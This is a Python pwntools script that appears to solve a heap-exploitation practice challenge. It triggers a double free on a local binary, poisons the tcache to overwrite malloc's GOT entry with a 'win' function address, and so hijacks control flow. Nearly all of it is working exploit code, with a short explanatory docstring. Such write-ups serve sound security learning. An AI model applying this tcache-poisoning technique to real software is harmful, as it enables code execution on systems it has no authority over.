#!/usr/bin/env python3

"""
Stack:      Canary found
NX:         NX enabled
PIE:        No PIE (0x3ff000)
ASLR:       Enabled

Double-free occurs when a memory chunk is freed twice, corrupting heap metadata. It can lead to code execution or crashes.

The exploit triggers a double-free vulnerability by freeing the same chunk twice, manipulating the tcache to point to GOT address
of malloc, and overwriting it with the win function's address. Subsequent malloc calls hijack execution to win.
"""

from pwn import *

bin = context.binary = ELF("./df")


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        context.terminal = ["gnome-terminal", "--"]
        return gdb.debug([bin.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([bin.path] + argv, *a, **kw)


gdbscript = """
tbreak main
continue
""".format(
    **locals()
)

# -- Exploit goes here --


def malloc(size):
    io.sendlineafter(b"exit\n", f"1 {size}".encode())


def free(index):
    io.sendlineafter(b"exit\n", f"2 {index}".encode())


def edit(index, data):
    io.sendlineafter(b"exit\n", f"3 {index} ".encode() + data)


io = start()

malloc(8)
free(0)
free(0)
malloc(8)
edit(1, pack(bin.got.malloc))
malloc(8)
malloc(8)
edit(3, pack(bin.sym.win))
malloc(8)

io.interactive()
